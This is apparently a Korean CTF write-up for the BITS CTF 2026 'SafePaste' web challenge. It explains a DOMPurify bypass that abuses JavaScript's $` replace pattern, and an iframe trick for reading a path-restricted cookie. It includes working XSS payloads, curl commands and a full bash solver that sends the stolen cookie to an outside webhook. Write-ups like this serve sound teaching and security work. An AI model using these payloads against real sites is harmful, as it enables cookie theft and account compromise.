---
title: "[Web] SafePaste"
description: Writing about the "SafePaste" of BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# SafePaste (BITS CTF 2026)
---
- Name : SafePaste
- Category : Web
- Description : Yet another paste challenge?
- Difficulty : ★★★
---

## TL;DR

1. `String.prototype.replace`의 `` $` `` (Dollar Backtick) 특수 패턴을 이용해 DOMPurify를 우회하는 mXSS를 발생시킴
2. `path=/hidden`으로 제한된 FLAG 쿠키를 `iframe src="/hidden/x"`(존재하지 않는 경로)의 `contentDocument.cookie`로 읽어냄
3. `encodeURIComponent`로 외부 webhook에 exfiltration

---

## Overview

SafePaste는 HTML을 허용하는 paste 공유 서비스입니다. DOMPurify로 서버사이드 sanitize를 수행하며,   
관리자 봇이 신고된 URL을 방문합니다. FLAG는 관리자 봇의 `/hidden` 경로 전용 쿠키에 저장되어 있어,   
XSS를 통해 쿠키를 훔치는 것이 목표입니다.

```
┌─────────────────────────────────────────────────────────────┐
│ 핵심 구성요소                                                │
│                                                             │
│  1. POST /create  → DOMPurify.sanitize() → 저장            │
│  2. GET  /paste/:id → template.replace("{paste}", content) │
│  3. POST /report  → 봇이 해당 URL 방문                     │
│  4. GET  /hidden  → FLAG 쿠키 (path=/hidden 으로 제한)      │
└─────────────────────────────────────────────────────────────┘
```

---

## Solution

### 1) Recon

**server.ts** 분석:

```typescript
// 1. DOMPurify로 sanitize 후 저장
const clean = DOMPurify.sanitize(content);
pastes.set(id, clean);

// 2. 단순 string replace로 HTML 템플릿에 삽입 ← 취약점!
const html = pasteTemplate.replace("{paste}", content);

// 3. FLAG 쿠키는 /hidden 경로에만 유효
await page.setCookie({
  name: "FLAG",
  value: FLAG,
  domain: APP_HOST,   // "localhost"
  path: "/hidden",    // ← /paste/ 에서는 document.cookie로 접근 불가
});

// 4. CSP가 unsafe-inline 허용
"script-src 'unsafe-inline' 'unsafe-eval'; ..."
```

- DOMPurify가 sanitize해도 template `replace` 단계에서 mXSS 가능
- FLAG 쿠키의 `path=/hidden` 제한을 우회해야 함
- CSP는 외부 도메인 fetch를 막지만 `document.location` redirect는 허용

---

### 2) Root Cause

#### 취약점 1: JavaScript `replace()`의 `$` 패턴

JavaScript의 `String.prototype.replace()`는 두 번째 인자(replacement string)에서 특수 패턴을 처리  

| 패턴 | 의미 |
|------|------|
| `$$` | `$` 문자 |
| `$&` | 매칭된 부분 전체 |
| **`` $` ``** | **매칭 이전의 모든 문자열** |
| `$'` | 매칭 이후의 모든 문자열 |

paste 템플릿이 다음과 같을 때:

```html
<!-- paste.html (앞부분 요약) -->
<!DOCTYPE html>
<html lang="en">
<head>...</head>
<body>
  <div class="content">{paste}</div>  <!-- replace 대상 -->
</body>
</html>
```

content에 `` $` `` 가 포함되면 `{paste}` 자리에 **`{paste}` 이전의 전체 HTML**이 삽입

```javascript
// content = '<p id="$`<img onerror=XSS>">'
template.replace("{paste}", content)

// 결과: id 속성에 template 앞부분이 삽입되면서
// 템플릿의 첫 번째 " 가 id 속성을 닫아버림!
// → <img onerror=XSS> 가 HTML context로 탈출
```

**실제 결과:**
```html
<div class="content">
  <p id="<!DOCTYPE html>
  <html lang="en">   ← id 속성 안에 삽입됨
    ...
    <div class="content"><img src=x onerror=PAYLOAD>  ← HTML context 탈출!
```

#### 취약점 2: `path=/hidden` 쿠키 접근

`history.pushState(null, '', '/hidden')`로 URL만 바꿔도   
Chrome은 실제 document URL 기준으로 cookie scope를 유지하므로 `document.cookie`로 FLAG 쿠키를 읽을 수 없습니다.

**해결: `iframe src="/hidden/x"`**

- `/hidden/x`는 존재하지 않는 404 경로지만 정상적으로 로드됨
- path가 `/hidden/x`이면 `/hidden` 쿠키의 scope에 포함됨
- 같은 origin이므로 `iframe.contentDocument.cookie`로 접근 가능!

```
/hidden   → 시크릿 없으면 res.socket.destroy() → iframe onload 안 fires!
/hidden/x → 404지만 정상 HTTP 응답 → iframe onload fires + path=/hidden 쿠키 접근 가능
```

---

### 3) Exploit

#### Step 1: DOMPurify가 통과시키는 payload 확인

```bash
# DOMPurify는 id 속성 내의 특수 문자를 안전하다고 판단
# 저장된 결과:
# <p id="</noscript><script>alert(1)</script>"></p>
# → id 속성값으로 저장되어 실제로는 무해해 보임
```

#### Step 2: `$`` 트릭으로 HTML context 탈출

```bash
# id 속성값 안에 `$`` 를 포함시키면:
# template.replace("{paste}", '<p id="$`<img onerror=XSS>">')
# → template 앞부분의 첫 " 가 id를 닫고 <img onerror=XSS> 가 HTML로 파싱됨
```

#### Step 3: FLAG 탈취 JavaScript 작성

```javascript
// iframe으로 /hidden/x 로드 → path=/hidden 쿠키 접근
var i = document.createElement('iframe');
i.src = '/hidden/x';
document.body.appendChild(i);
setTimeout(function() {
  var c = i.contentDocument.cookie;  // FLAG=BITSCTF{...} 접근!
  location.href = 'WEBHOOK_URL?c=' + encodeURIComponent(c);
}, 2000);
```

#### Step 4: 최종 Exploit 스크립트

```bash
WEBHOOK="https://ojaucwj.request.dreamhack.games"

JS="var i=document.createElement('iframe');i.src='/hidden/x';document.body.appendChild(i);setTimeout(()=>{var c=i.contentDocument.cookie;location.href='${WEBHOOK}?c='+encodeURIComponent(c);},2000);"
B64=$(echo -n "$JS" | base64 -w 0)

# 악성 paste 생성 ($` 트릭 + DOMPurify bypass)
PASTE_ID=$(curl -sX POST http://20.193.149.152:3000/create \
  --data-urlencode "content=<p id=\"\$\`<img src=x onerror=eval(atob(\`${B64}\`))>\">" \
  -D - -o /dev/null | grep -i location | tr -d '\r' | awk '{print $2}' | cut -d'/' -f3)

echo "Paste: $PASTE_ID"

# 봇에게 신고 (공인 IP로 report → 봇이 방문 → XSS 실행)
curl -sX POST http://20.193.149.152:3000/report \
  --data-urlencode "url=http://20.193.149.152:3000/paste/$PASTE_ID"
```

---

### 4) Why it works

#### 공격 체인 전체 흐름

```
[공격자]
    │
    ├─ 1. POST /create (악성 payload)
    │      └─ DOMPurify.sanitize() 통과
    │         └─ <p id="$`<img onerror=eval(atob(...))>"> 저장
    │
    ├─ 2. GET /paste/:id
    │      └─ template.replace("{paste}", stored_content)
    │         └─ $` 패턴 → template 앞부분 삽입 → id 닫힘
    │            └─ <img src=x onerror=...> HTML context 노출
    │
    ├─ 3. POST /report (url=http://...paste/:id)
    │      └─ 봇이 URL 방문
    │         └─ headless Chrome이 XSS 실행
    │
    └─ 4. XSS 실행
           ├─ iframe src="/hidden/x" 로드 (404지만 정상 응답)
           ├─ path=/hidden 쿠키가 iframe에 포함됨
           ├─ contentDocument.cookie = "FLAG=BITSCTF{...}"
           └─ document.location → webhook exfiltration
```

#### 각 우회 포인트

| 보호 수단 | 우회 방법 |
|-----------|-----------|
| DOMPurify sanitize | `id` 속성값 안에 숨겨서 통과 |
| template inject | JS `replace()`의 `` $` `` 패턴으로 HTML context 탈출 |
| `path=/hidden` 쿠키 | `iframe src="/hidden/x"` (하위 경로는 상위 path 쿠키 포함) |
| `document.cookie` scope | iframe의 `contentDocument.cookie`로 우회 |
| CSP `default-src 'self'` | `document.location` redirect는 navigation이므로 허용 |
| `/hidden` 소켓 파괴 | `/hidden/x` (404)는 소켓 파괴 없이 정상 로드 |

---

## Solver

```bash
#!/bin/bash

TARGET="${1:-http://20.193.149.152:3000}"
WEBHOOK="${2:-https://your-webhook-url}"

echo "[*] Target: $TARGET"
echo "[*] Webhook: $WEBHOOK"

# XSS payload: iframe /hidden/x → cookie exfil
JS="var i=document.createElement('iframe');i.src='/hidden/x';document.body.appendChild(i);setTimeout(function(){try{var c=i.contentDocument.cookie;location.href='${WEBHOOK}?c='+encodeURIComponent(c);}catch(e){location.href='${WEBHOOK}?e='+encodeURIComponent(e.toString());}},2000);"
B64=$(echo -n "$JS" | base64 -w 0)

echo "[*] Payload (base64): ${B64:0:50}..."

# 1. 악성 paste 생성 ($` trick + DOMPurify bypass)
PASTE_ID=$(curl -sX POST "${TARGET}/create" \
  --data-urlencode "content=<p id=\"\$\`<img src=x onerror=eval(atob(\`${B64}\`))>\">" \
  -D - -o /dev/null | grep -i "^< location:" | tr -d '\r' | awk '{print $3}' | cut -d'/' -f3)

if [ -z "$PASTE_ID" ]; then
  echo "[!] Failed to create paste"
  exit 1
fi

echo "[+] Created paste: $PASTE_ID"
echo "[+] URL: ${TARGET}/paste/${PASTE_ID}"

# 2. onerror payload 확인
echo "[*] Verifying XSS payload..."
VERIFY=$(curl -s "${TARGET}/paste/${PASTE_ID}" | grep -o "onerror[^>]*" | head -1)
if [ -z "$VERIFY" ]; then
  echo "[!] XSS payload not found in stored HTML"
  exit 1
fi
echo "[+] XSS confirmed: ${VERIFY:0:60}..."

# 3. 봇에게 신고
echo "[*] Reporting to bot..."
REPORT=$(curl -s -X POST "${TARGET}/report" \
  --data-urlencode "url=${TARGET}/paste/${PASTE_ID}")
echo "[+] Report response: $REPORT"

echo ""
echo "[*] Waiting for bot to visit (15 seconds)..."
echo "[*] Check your webhook at: $WEBHOOK"
sleep 15

echo ""
echo "[+] Done! Decode the flag:"
echo "    python3 -c \"import urllib.parse; print(urllib.parse.unquote('FLAG_VALUE_FROM_WEBHOOK'))\""
```

---

```bash
python3 -c "import urllib.parse; print(urllib.parse.unquote('FLAG%3DBITSCTF%7B...%7D'))"
# FLAG=BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}
```
---
<img width="1706" height="550" alt="스크린샷 2026-02-22 062123" src="https://github.com/user-attachments/assets/618c879e-12fe-4745-87c0-2a9dcfa9af52" />
<img width="1190" height="302" alt="스크린샷 2026-02-22 171852" src="https://github.com/user-attachments/assets/ac7e7406-2f3c-40e4-96d1-ef75bbfa9c55" />
---

**Flag:** `BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}`

---
